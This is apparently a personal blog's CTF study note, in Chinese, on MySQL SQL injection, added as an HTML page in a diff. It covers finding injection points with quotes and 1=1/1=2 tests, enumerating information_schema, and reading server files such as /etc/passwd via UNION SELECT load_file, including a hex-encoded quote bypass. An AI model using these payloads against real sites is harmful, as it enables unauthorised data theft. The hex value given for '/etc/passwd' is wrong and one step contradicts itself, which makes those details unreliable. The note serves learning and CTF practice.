@@ -1,0 +1,653 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)">
+<meta name="generator" content="Hexo 6.0.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.loli.net/css?family=Noto+Serif+SC:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.9.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="sql注入注意：注释：url中#号是用来指导浏览器动作的（例如锚点），对服务器端完全无用。所以，HTTP请求中不包括# 将#号改成url的编码%23就可以了，或者使用 –+ 不能使用–，＋号在语句中变成了空格。用来和后面的单引号分隔开，将后面的语句注释。 了解原理后便知道了–无法使用的原因，是因为–与后面的这个单引号连接在一起，无法形成有效的mysql语句。 在mysql中使用这个语句分析原因，输">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql注入">
+<meta property="og:url" content="http://example.com/2022/03/04/sql%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="Echo">
+<meta property="og:description" content="sql注入注意：注释：url中#号是用来指导浏览器动作的（例如锚点），对服务器端完全无用。所以，HTTP请求中不包括# 将#号改成url的编码%23就可以了，或者使用 –+ 不能使用–，＋号在语句中变成了空格。用来和后面的单引号分隔开，将后面的语句注释。 了解原理后便知道了–无法使用的原因，是因为–与后面的这个单引号连接在一起，无法形成有效的mysql语句。 在mysql中使用这个语句分析原因，输">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220304214654204.png">
+<meta property="og:image" content="http://example.com/2022/03/04/sql%E6%B3%A8%E5%85%A5/2019022422162974.png">
+<meta property="og:image" content="http://example.com/2022/03/04/sql%E6%B3%A8%E5%85%A5/20190224222331730.png">
+<meta property="og:image" content="http://example.com/2022/03/04/sql%E6%B3%A8%E5%85%A5/20190224191228560.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190224191512414.png">
+<meta property="og:image" content="http://example.com/2022/03/04/sql%E6%B3%A8%E5%85%A5/20190224193113204.png">
+<meta property="og:image" content="http://example.com/2022/03/04/sql%E6%B3%A8%E5%85%A5/20190224223136534.png">
+<meta property="og:image" content="http://example.com/2022/03/04/sql%E6%B3%A8%E5%85%A5/20190224223317122.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2019022422340713.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190224223849184.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190224224213520.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190224224328555.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190224224351430.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190224224526351.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190224225212438.png">
+<meta property="og:image" content="http://example.com/2022/03/04/sql%E6%B3%A8%E5%85%A5/638">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9144690-61931af2bff33033.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/669">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9144690-ad2ec2eb515ed27e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/665">
+<meta property="og:image" content="http://example.com/2022/03/04/sql%E6%B3%A8%E5%85%A5/70">
+<meta property="og:image" content="http://example.com/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308163516499.png">
+<meta property="og:image" content="http://example.com/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308163726592.png">
+<meta property="og:image" content="http://example.com/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308163823741.png">
+<meta property="og:image" content="http://example.com/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308164044032.png">
+<meta property="og:image" content="http://example.com/2022/03/04/sql%E6%B3%A8%E5%85%A5/70">
+<meta property="og:image" content="http://example.com/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308163043347.png">
+<meta property="og:image" content="http://example.com/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308163120840.png">
+<meta property="og:image" content="http://example.com/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308163207104.png">
+<meta property="og:image" content="http://example.com/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308164314139.png">
+<meta property="og:image" content="http://example.com/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308164347248.png">
+<meta property="og:image" content="http://example.com/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308164404811.png">
+<meta property="og:image" content="http://example.com/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308164651871.png">
+<meta property="og:image" content="http://example.com/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308164807879.png">
+<meta property="og:image" content="http://example.com/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308164836850.png">
+<meta property="og:image" content="http://example.com/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308164851469.png">
+<meta property="og:image" content="http://example.com/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308165044761.png">
+<meta property="og:image" content="http://example.com/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308165125478.png">
+<meta property="og:image" content="http://example.com/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308165233684.png">
+<meta property="og:image" content="http://example.com/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308165407344.png">
+<meta property="og:image" content="http://example.com/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308165421680.png">
+<meta property="og:image" content="http://example.com/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308165708693.png">
+<meta property="og:image" content="http://example.com/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308165728547.png">
+<meta property="og:image" content="http://example.com/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308165829448.png">
+<meta property="og:image" content="http://example.com/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308165917864.png">
+<meta property="article:published_time" content="2022-03-04T13:53:45.000Z">
+<meta property="article:modified_time" content="2022-05-07T14:42:34.831Z">
+<meta property="article:author" content="CJ">
+<meta property="article:tag" content="STUDY">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220304214654204.png">
+
+
+<link rel="canonical" href="http://example.com/2022/03/04/sql%E6%B3%A8%E5%85%A5/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2022/03/04/sql%E6%B3%A8%E5%85%A5/","path":"2022/03/04/sql注入/","title":"sql注入"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>sql注入 | Echo</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Echo</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">CJ'S BLOG</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="nav-number">1.</span> <span class="nav-text">sql注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E5%88%A4%E6%96%AD"><span class="nav-number">1.1.</span> <span class="nav-text">0x01 判断</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8-Sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.1.0.1.</span> <span class="nav-text">判断是否存在 Sql 注入漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A4%E6%96%AD-Sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%B1%BB%E5%9E%8B"><span class="nav-number">1.1.0.2.</span> <span class="nav-text">判断 Sql 注入漏洞的类型</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%95%B0%E5%AD%97%E5%9E%8B%E5%88%A4%E6%96%AD%EF%BC%9A"><span class="nav-number">1.1.0.2.1.</span> <span class="nav-text">数字型判断：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E5%9E%8B%E5%88%A4%E6%96%AD%EF%BC%9A"><span class="nav-number">1.1.0.2.2.</span> <span class="nav-text">字符型判断：</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-information-schema"><span class="nav-number">1.2.</span> <span class="nav-text">0x02 information_schema</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E5%87%BD%E6%95%B0"><span class="nav-number">1.3.</span> <span class="nav-text">0x03 函数</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#MySQL-%E6%98%BE%E9%94%99%E5%BC%8F%E6%B3%A8%E5%85%A5%EF%BC%8C%E4%BD%BF%E7%94%A8%E9%94%99%E8%AF%AF%E6%8F%90%E5%8F%96%E6%B6%88%E6%81%AF"><span class="nav-number">1.3.1.</span> <span class="nav-text">MySQL 显错式注入，使用错误提取消息</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="nav-number">1.4.</span> <span class="nav-text">0x04宽字节注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-MySQL-%E9%95%BF%E5%AD%97%E7%AC%A6%E6%88%AA%E6%96%AD"><span class="nav-number">1.5.</span> <span class="nav-text">0x05. MySQL 长字符截断</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5"><span class="nav-number">1.6.</span> <span class="nav-text">0x06 延时注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07%E5%9F%BA%E4%BA%8Ebool%E7%9A%84%E7%9B%B2%E6%B3%A8"><span class="nav-number">1.7.</span> <span class="nav-text">0x07基于bool的盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="nav-number">1.7.0.1.</span> <span class="nav-text">1 判断注入点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2%E8%AF%BB%E6%95%B0%E6%8D%AE"><span class="nav-number">1.7.0.2.</span> <span class="nav-text">2读数据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="nav-number">1.7.0.3.</span> <span class="nav-text">3常用函数</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x08-%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84%E7%9B%B2%E6%B3%A8"><span class="nav-number">1.8.</span> <span class="nav-text">0x08.基于时间的盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x09-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">1.9.</span> <span class="nav-text">0x09 报错注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#floor%EF%BC%9A"><span class="nav-number">1.9.1.</span> <span class="nav-text">floor：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#updatexml"><span class="nav-number">1.9.2.</span> <span class="nav-text">updatexml:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#extractvalue"><span class="nav-number">1.9.3.</span> <span class="nav-text">extractvalue()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">1.9.4.</span> <span class="nav-text">exp():</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x10-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="nav-number">1.10.</span> <span class="nav-text">0x10 二次注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x11-%E7%BB%95%E8%BF%87"><span class="nav-number">1.11.</span> <span class="nav-text">0x11 绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E5%85%B3%E9%94%AE%E5%AD%97"><span class="nav-number">1.11.1.</span> <span class="nav-text">过滤关键字</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC"><span class="nav-number">1.11.2.</span> <span class="nav-text">过滤空格</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E5%8D%95%E5%BC%95%E5%8F%B7"><span class="nav-number">1.11.3.</span> <span class="nav-text">过滤单引号</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x12-sql%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6"><span class="nav-number">1.12.</span> <span class="nav-text">0x12 sql读写文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x13-md5-str-true-%E7%B1%BB%E5%9E%8B%E7%BB%95%E8%BF%87"><span class="nav-number">1.13.</span> <span class="nav-text">0x13 md5($str,true)类型绕过</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">CJ</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">23</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/cjtyx" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;cjtyx" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:2081297822@qq.com" title="E-Mail → mailto:2081297822@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/04/sql%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="CJ">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Echo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          sql注入
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2022-03-04 21:53:45" itemprop="dateCreated datePublished" datetime="2022-03-04T21:53:45+08:00">2022-03-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-05-07 22:42:34" itemprop="dateModified" datetime="2022-05-07T22:42:34+08:00">2022-05-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="Symbols count in article">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">Symbols count in article: </span>
+      <span>11k</span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>10 mins.</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p>注意：注释：url中#号是用来指导浏览器动作的（例如锚点），对服务器端完全无用。所以，HTTP请求中不包括<code>#</code></p>
+<p>将#号改成url的编码<code>%23</code>就可以了，或者使用 –+</p>
+<p>不能使用–，＋号在语句中变成了空格。用来和后面的单引号分隔开，将后面的语句注释。</p>
+<p>了解原理后便知道了–无法使用的原因，是因为–与后面的这个单引号连接在一起，无法形成有效的mysql语句。</p>
+<p>在mysql中使用这个语句分析原因，输入后回车显示分号没有闭合<br><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220304214654204.png" alt="image-20220304214654204"></p>
+<p>所以在注入时我们除了–+外，也可以使用–’来完成注入语句</p>
+<p>通过order by判断回显数</p>
+<h2 id="0x01-判断"><a href="#0x01-判断" class="headerlink" title="0x01 判断"></a>0x01 判断</h2><h4 id="判断是否存在-Sql-注入漏洞"><a href="#判断是否存在-Sql-注入漏洞" class="headerlink" title="判断是否存在 Sql 注入漏洞"></a>判断是否存在 Sql 注入漏洞</h4><p><strong>单引号判断法</strong>：<br> 在参数后面加上单引号,比如:<a target="_blank" rel="noopener" href="http://xxx/abc.php?id=1&#39;">http://xxx/abc.php?id=1&#39;</a></p>
+<p>如果页面返回错误，则存在 Sql 注入。原因是无论字符型还是整型都会因为单引号个数不匹配而报错。（如果未报错，不代表不存在 Sql 注入，因为有可能页面对单引号做了过滤，这时可以使用判断语句进行注入）</p>
+<h4 id="判断-Sql-注入漏洞的类型"><a href="#判断-Sql-注入漏洞的类型" class="headerlink" title="判断 Sql 注入漏洞的类型"></a>判断 Sql 注入漏洞的类型</h4><p>通常 Sql 注入漏洞分为 2 种类型：</p>
+<ul>
+<li>数字型</li>
+<li>字符型</li>
+</ul>
+<p>其实所有的类型都是根据数据库本身表的类型所产生的，在我们创建表的时候会发现其后总有个数据类型的限制，而不同的数据库又有不同的数据类型，但是无论怎么分，<strong>常用</strong>的查询数据类型总是以数字与字符来区分的，所以就会产生注入点为何种类型。</p>
+<h5 id="数字型判断："><a href="#数字型判断：" class="headerlink" title="数字型判断："></a>数字型判断：</h5><p>当输入的参 x 为整型时，通常 abc.php 中 Sql 语句类型大致如下：<br> <code>select * from &lt;表名&gt; where id = x</code><br> 这种类型可以使用经典的 <code>and 1=1</code> 和 <code>and 1=2</code> 来判断：</p>
+<ul>
+<li>1.Url 地址中输入 <code>http://xxx/abc.php?id= x and 1=1</code> 页面依旧运行正常，继续进行下一步。</li>
+<li>2.Url 地址中继续输入 <code>http://xxx/abc.php?id= x and 1=2</code> 页面运行错误，则说明此 Sql 注入为数字型注入。</li>
+</ul>
+<p>原因如下：<br> 当输入 <code>and 1=1</code>时，后台执行 Sql 语句：</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> &lt;表名&gt; <span class="keyword">where</span> id = x <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span> </span><br></pre></td></tr></table></figure>
+
+<p>没有语法错误且逻辑判断为正确，所以返回正常。</p>
+<p>当输入 <code>and 1=2</code>时，后台执行 Sql 语句：</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> &lt;表名&gt; <span class="keyword">where</span> id = x <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span></span><br></pre></td></tr></table></figure>
+
+<p>没有语法错误但是逻辑判断为假，所以返回错误。</p>
+<p>我们再使用假设法：如果这是字符型注入的话，我们输入以上语句之后应该出现如下情况：</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> &lt;表名&gt; <span class="keyword">where</span> id = <span class="string">&#x27;x and 1=1&#x27;</span> </span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> &lt;表名&gt; <span class="keyword">where</span> id = <span class="string">&#x27;x and 1=2&#x27;</span> </span><br></pre></td></tr></table></figure>
+
+<p>查询语句将 and 语句全部转换为了字符串，并没有进行 and 的逻辑判断，所以不会出现以上结果，故假设是不成立的。</p>
+<h5 id="字符型判断："><a href="#字符型判断：" class="headerlink" title="字符型判断："></a>字符型判断：</h5><p>当输入的参 x 为字符型时，通常 abc.php 中 SQL 语句类型大致如下：<br> <code>select * from &lt;表名&gt; where id = &#39;x&#39;</code><br> 这种类型我们同样可以使用 <code>and &#39;1&#39;=&#39;1</code> 和 <code>and &#39;1&#39;=&#39;2</code>来判断：</p>
+<ul>
+<li>1.Url 地址中输入 <code>http://xxx/abc.php?id= x&#39; and &#39;1&#39;=&#39;1</code> 页面运行正常，继续进行下一步。</li>
+<li>2.Url 地址中继续输入 <code>http://xxx/abc.php?id= x&#39; and &#39;1&#39;=&#39;2</code> 页面运行错误，则说明此 Sql 注入为字符型注入。</li>
+</ul>
+<p>原因如下：<br> 当输入 <code>and &#39;1&#39;=&#39;1</code>时，后台执行 Sql 语句：</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> &lt;表名&gt; <span class="keyword">where</span> id = <span class="string">&#x27;x&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>语法正确，逻辑判断正确，所以返回正确。</p>
+<p>当输入  <code>and &#39;1&#39;=&#39;2</code>时，后台执行 Sql 语句：</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> &lt;表名&gt; <span class="keyword">where</span> id = <span class="string">&#x27;x&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;2‘</span></span><br></pre></td></tr></table></figure>
+
+<p>语法正确，但逻辑判断错误，所以返回正确</p>
+<p>或者直接：输入 <a target="_blank" rel="noopener" href="http://xxx/abc.php?id=">http://xxx/abc.php?id=</a> x’，运行错误</p>
+<p>输入 <a target="_blank" rel="noopener" href="http://xxx/abc.php?id=">http://xxx/abc.php?id=</a> x’#，运行正常</p>
+<p>select * from &lt;表名&gt; where id = ‘x’#’</p>
+<p><strong>字符型一般需要使用单引号来闭合。字符型注入最关键的是如何闭合</strong> SQL <strong>语句以及注释多余的代码。</strong></p>
+<h2 id="0x02-information-schema"><a href="#0x02-information-schema" class="headerlink" title="0x02 information_schema"></a>0x02 information_schema</h2><p><code>information_schema</code> 是 mysql 自带数据库，保存了 Mysql 服务器所有数据库的信息,如数据库名，数据库的表，表栏的数据类型与访问权限等。该数据库拥有一个名为 tables 的数据表，该表包含两个字段 table_name 和 table_schema，分别记录 DBMS 中的存储的表名和表名所在的数据库。</p>
+<p> <strong>获取元数据</strong></p>
+<p>① 查询用户数据库名称<br>SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA<br>INFORMATION_SCHEMA.SCHEMATA 表提供了关于数据库的信息。</p>
+<p>②查询当前数据表<br>SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = (SELECT DATABASE())<br>INFORMATION_SCHEMA.TABLES 表给出了数据库中表的信息。</p>
+<p>③查询指定表的所有字段<br>SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = ‘***’<br>INFORMATION_SCHEMA.COLUMNS 表中给出了表中的列信息。</p>
+<p> <strong>MySQL 函数利用</strong></p>
+<p>① load_file() 函数读文件操作<br>MySQL 提供了 load_file() 函数，可以帮助用户快速读取文件，但文件的位置必须在服务器上，文件必须为绝对路径，且用户必须有 FILE 权限，文件容量也必须小于 max_allowed_packet 字节 (默认为 16MB，最大为 1GB)。</p>
+<p>SQL 语句如下：<br>UNION SELECT 1, load_file(‘/etc/passwd’), 3, 4 #</p>
+<p>通常一些防注入语句不允许单引号出现，那么可以使用一下语句绕过：<br>UNION SELECT 1, load_file(0x2F6561342F706173737764), 3, 4 #<br>“0x2F6561342F706173737764” 为 “/etc/passwd” 的十六进制转换结果。</p>
+<p>在浏览器返回数据时，有可能存在乱码问题，那么可以使用 hex() 函数将字符串转换为十六进制数据。</p>
